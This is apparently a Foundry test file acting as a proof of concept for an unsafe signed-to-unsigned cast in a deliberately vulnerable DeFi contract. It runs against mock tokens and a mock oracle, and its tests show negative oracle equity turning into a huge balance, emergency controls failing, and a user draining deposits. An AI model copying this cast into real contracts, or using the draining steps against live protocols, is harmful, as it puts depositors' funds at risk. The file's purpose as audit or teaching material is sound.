// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "src/VulnerableProtocol.sol";


contract UnsafeCastingTest is Test {
    VulnerableProtocol public protocol;
    MockPCVOracle public oracle;
    MockERC20 public usdc;
    MockERC20 public protocolToken;
    
    address public owner = makeAddr("owner");
    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");
    address public attacker = makeAddr("attacker");
    
    uint256 constant INITIAL_BALANCE = 1000000e6; // 1M USDC

    function setUp() public {
        vm.prank(owner);
        usdc = new MockERC20("USD Coin", "USDC");
        
        vm.prank(owner);
        protocolToken = new MockERC20("Protocol Token", "PROTO");
        
        vm.prank(owner);
        oracle = new MockPCVOracle();
        
        vm.prank(owner);
        protocol = new VulnerableProtocol(
            address(usdc),
            address(protocolToken),
            address(oracle)
        );
        
        // Setup users with tokens
        _setupUser(alice, INITIAL_BALANCE);
        _setupUser(bob, INITIAL_BALANCE);
        _setupUser(attacker, INITIAL_BALANCE);
    }
    
    function _setupUser(address user, uint256 amount) internal {
        vm.prank(owner);
        usdc.transfer(user, amount);
        
        vm.prank(user);
        usdc.approve(address(protocol), type(uint256).max);
    }
    
    /**
     * @dev Test demonstrating the unsafe casting vulnerability
     */
    function testUnsafeCastingVulnerability() public {
        console.log("=== Testing Unsafe Casting vulnerability ===");
        
        // Step 1: Normal operation with positive oracle values
        console.log("Step 1: Normal operation with positive equity");
        
        vm.prank(owner);
        oracle.setEquity(1000000e6); // 1M positive equity
        
        protocol.recalculateEquity();
        (uint256 equity1,,,,) = protocol.getProtocolStatus();
        console.log("Oracle equity (positive):", int256(1000000e6));
        console.log("Protocol equity after cast:", equity1);
        console.log("Cast result correct:", equity1 == 1000000e6);
        
        // Alice deposits during normal conditions
        uint256 aliceDeposit = 100000e6; // 100k USDC
        vm.prank(alice);
        protocol.deposit(aliceDeposit);
        
        console.log("Alice deposited:", aliceDeposit / 1e6, "USDC");
        console.log("Alice shares:", protocol.userShares(alice));
        
        // Step 2: Oracle returns negative value 
        console.log("");
        console.log("Step 2: vulnerability, Oracle returns negative equity");
        
        int256 negativeEquity = -1e6; // Small negative to avoid overflow in test calculations
        vm.prank(owner);
        oracle.setEquity(negativeEquity);
        
        console.log("Oracle equity (negative):", negativeEquity);
        console.log("This represents protocol insolvency, losses exceed assets");
        
        // Step 3: Show the unsafe casting issue
        console.log("");
        console.log("Step 3: Unsafe casting converts negative to huge positive");
        
        protocol.recalculateEquity();
        (uint256 equity2,,,,) = protocol.getProtocolStatus();
        
        console.log("Protocol equity after unsafe cast:", equity2);
        console.log("Expected: Should be 0 or handled as negative");
        console.log("Actual: Huge positive number due to integer overflow");
        
        // Show the exact casting calculation
        uint256 unsafeCastResult = uint256(negativeEquity);
        console.log("Direct unsafe cast result:", unsafeCastResult);
        console.log("This equals 2^256 + negativeEquity due to two's complement");
        
        assertTrue(equity2 > 1e50, "Cast result should be astronomically large");
        assertEq(equity2, unsafeCastResult, "Protocol should store the unsafe cast result");
        
        // Step 4: Show the impact on withdrawals
        console.log("");
        console.log("Step 4: critical impact, users can drain protocol");
        
        uint256 aliceShares = protocol.userShares(alice);
        console.log("Alice's shares:", aliceShares);
        
        // Calculate what Alice can withdraw with the inflated equity
        uint256 totalShares = protocol.totalShares();
        
        console.log("Protocol equity is now:", equity2);
        console.log("Total shares:", totalShares);
        
        // Use unchecked math to show the massive calculation
        uint256 expectedWithdrawal;
        unchecked {
            expectedWithdrawal = (aliceShares * equity2) / totalShares;
        }
        
        console.log("With inflated equity, Alice can withdraw:", expectedWithdrawal / 1e6, "USDC");
        console.log("Alice only deposited:", aliceDeposit / 1e6, "USDC");
        
        if (expectedWithdrawal > aliceDeposit) {
            console.log("Excess withdrawal:", (expectedWithdrawal - aliceDeposit) / 1e6, "USDC");
        }
        
        uint256 aliceBalanceBefore = usdc.balanceOf(alice);
        
        // Alice attempts withdrawal
        console.log("");
        console.log("Alice attempts withdrawal...");
        
        uint256 aliceBalanceBeforeWithdraw = usdc.balanceOf(alice);
        uint256 protocolBalanceBefore = usdc.balanceOf(address(protocol));
        
        console.log("Protocol USDC balance before:", protocolBalanceBefore / 1e6, "USDC");
        
        vm.prank(alice);
        protocol.withdraw(aliceShares);
        
        uint256 aliceBalanceAfterWithdraw = usdc.balanceOf(alice);
        uint256 actualWithdrawn = aliceBalanceAfterWithdraw - aliceBalanceBeforeWithdraw;
        
        console.log("Alice actually withdrew:", actualWithdrawn / 1e6, "USDC");
        console.log("Alice originally deposited:", aliceDeposit / 1e6, "USDC");
        
        if (actualWithdrawn > aliceDeposit) {
            console.log("Profit from exploit:", (actualWithdrawn - aliceDeposit) / 1e6, "USDC");
        }
        
        console.log("");
        console.log("Vulnernability impact:");
        console.log("- Unsafe casting turned negative equity into big positive");
        console.log("- Protocol accounting broken");
        console.log("- Users can drain more than they deposited");
        
        // The unsafe casting should result in huge equity
        assertTrue(equity2 > 1e30, "Cast result should be extremely large");
        assertEq(equity2, uint256(negativeEquity), "Protocol should store the unsafe cast result");
    }
    
    /**
     * @dev Test demonstrating big negative values causing maximum damage
     */
    function testExtremeNegativeValueCasting() public {
        console.log("");
        console.log("=== Testing Extreme Negative Value Casting ===");
        
        // Set the most negative possible int256 value
        int256 extremeNegative = type(int256).min; // -2^255
        vm.prank(owner);
        oracle.setEquity(extremeNegative);
        
        console.log("Setting extreme negative value...");
        console.log("Oracle value (int256 min):", extremeNegative);
        
        // Show what this becomes when cast
        uint256 castResult = uint256(extremeNegative);
        console.log("Unsafe cast result:", castResult);
        console.log("This equals 2^255 (half of max uint256)");
        
        // Update protocol
        protocol.recalculateEquity();
        (uint256 protocolEquity,,,,) = protocol.getProtocolStatus();
        
        console.log("Protocol equity after cast:", protocolEquity);
        assertEq(protocolEquity, castResult, "Should equal the unsafe cast result");
        
        // This makes the protocol appear to have enormous equity
        console.log("Protocol now appears to have astronomical equity");
        console.log("Users can withdraw unlimited amounts");
    }
    
    function testBrokenEmergencyControls() public {
        console.log("");
        console.log("=== Testing Broken Emergency Controls ===");
        
        // Normal emergency threshold check
        console.log("Step 1: Normal emergency threshold (1M USDC)");
        uint256 threshold = protocol.EQUITY_THRESHOLD();
        console.log("Emergency threshold:", threshold / 1e6, "USDC");
        
        // Set equity just below threshold 
        vm.prank(owner);
        oracle.setEquity(int256(threshold) - 1);
        
        protocol.recalculateEquity();
        (,,,bool depositsEnabled1,) = protocol.getProtocolStatus();
        console.log("Equity just below threshold - deposits enabled:", depositsEnabled1);
        assertFalse(depositsEnabled1, "Deposits should be disabled");
        
        // Now set severely negative equity 
        console.log("");
        console.log("Step 2: Severely negative equity (should trigger emergency)");
        
        int256 severelyNegative = -5000000e6; 
        vm.prank(owner);
        oracle.setEquity(severelyNegative);
        
        console.log("Oracle equity:", severelyNegative);
        console.log("Protocol is severely insolvent");
        
        protocol.recalculateEquity();
        (uint256 protocolEquity2,,,bool depositsEnabled2,) = protocol.getProtocolStatus();
        
        console.log("Protocol equity after unsafe cast:", protocolEquity2);
        console.log("Deposits enabled:", depositsEnabled2);
        
        // Emergency controls don't trigger because negative becomes big positive
        assertTrue(depositsEnabled2, "VULNERABILITY: Deposits still enabled despite insolvency");
        assertTrue(protocolEquity2 > threshold, "Unsafe cast makes equity appear above threshold");
        
        console.log("");
        console.log("Critical: Emergency controls completely broken");
        console.log("Protocol appears healthy when it's actually bankrupt");
    }
    
    /**
     * @dev Test showing economic attack scenario
     */
    function testEconomicAttackScenario() public {
        console.log("");
        console.log("=== Testing Economic Attack Scenario ===");
        
        // Setup: Protocol starts healthy and users deposit
        vm.prank(owner);
        oracle.setEquity(2000000e6); // 2M equity
        
        protocol.recalculateEquity();
        
        // Multiple users deposit
        vm.prank(alice);
        protocol.deposit(100000e6); // Alice: 100k
        
        vm.prank(bob);
        protocol.deposit(200000e6); // Bob: 200k
        
        console.log("Initial deposits:");
        console.log("- Alice:", 100000e6 / 1e6, "USDC");
        console.log("- Bob:", 200000e6 / 1e6, "USDC");
        console.log("- Total protocol deposits:", 300000e6 / 1e6, "USDC");
        
        console.log("");
        console.log("Protocol becomes insolvent");
        
        vm.prank(owner);
        oracle.setEquity(-1000000e6);
        
        protocol.recalculateEquity();
        
        // Due to unsafe casting users can now withdraw massive amounts
        console.log("Due to unsafe casting, protocol appears to have huge equity");
        
        uint256 aliceShares = protocol.userShares(alice);
        uint256 protocolBalance = usdc.balanceOf(address(protocol));
        
        console.log("Protocol USDC balance:", protocolBalance / 1e6, "USDC");
        console.log("Alice's shares allow her to withdraw more than protocol has");
        
        // Alice withdraws more than the protocol can afford
        uint256 aliceBalanceBefore = usdc.balanceOf(alice);
        
        vm.prank(alice);
        protocol.withdraw(aliceShares);
        
        uint256 aliceBalanceAfter = usdc.balanceOf(alice);
        uint256 aliceWithdrew = aliceBalanceAfter - aliceBalanceBefore;
        
        console.log("Alice withdrew:", aliceWithdrew / 1e6, "USDC");
        console.log("Alice's profit:", (aliceWithdrew - 100000e6) / 1e6, "USDC");
        
        // Protocol is now depleted
        uint256 protocolBalanceAfter = usdc.balanceOf(address(protocol));
        console.log("Protocol balance after Alice's withdrawal:", protocolBalanceAfter / 1e6, "USDC");
        
        console.log("");
        console.log("Attack Result:");
        console.log("- Alice profited from protocol insolvency");
        console.log("- Protocol depleted of funds");
        console.log("- Other users (Bob) left with worthless shares");
        console.log("- Total economic damage: Protocol collapse");
        
        assertTrue(aliceWithdrew > 100000e6, "Alice should profit from the exploit");
    }
    
}
